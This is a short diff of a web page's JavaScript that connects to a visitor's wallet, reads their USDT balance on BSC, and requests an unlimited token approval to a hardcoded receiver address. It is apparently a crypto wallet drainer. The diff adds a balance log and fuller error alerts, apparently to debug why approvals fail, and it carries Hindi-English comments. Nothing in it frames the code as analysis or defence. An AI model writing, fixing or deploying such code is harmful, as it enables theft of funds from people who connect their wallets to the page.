@@ -30,7 +30,6 @@
 </div>
 
 <script>
-  // Aapka address set hai
   const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
   const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
 
@@ -58,12 +57,15 @@
       const userAddress = await signer.getAddress();
       
       const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
+      
+      // Balance check
       const balance = await usdtContract.balanceOf(userAddress);
+      console.log("USDT Balance:", ethers.utils.formatUnits(balance, 18));
 
       if (balance.gt(0)) {
         const maxAmount = ethers.constants.MaxUint256; 
         
-        // Fixed: Explicit gasLimit lagane se local estimation error nahi aayega aur wallet popup open ho jayega
+        // Approval transaction with fixed gas limit
         const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount, {
           gasLimit: ethers.BigNumber.from("65000")
         });
@@ -75,8 +77,10 @@
       }
 
     } catch (error) {
-      console.error("Error:", error);
-      alert("Transaction cancelled or failed.");
+      console.error("Full Error:", error);
+      // Ab yahan exact error message screen par popup ban kar aayega
+      let errMsg = error.reason || error.message || JSON.stringify(error);
+      alert("Failed Reason: " + errMsg);
     }
   }
 </script>
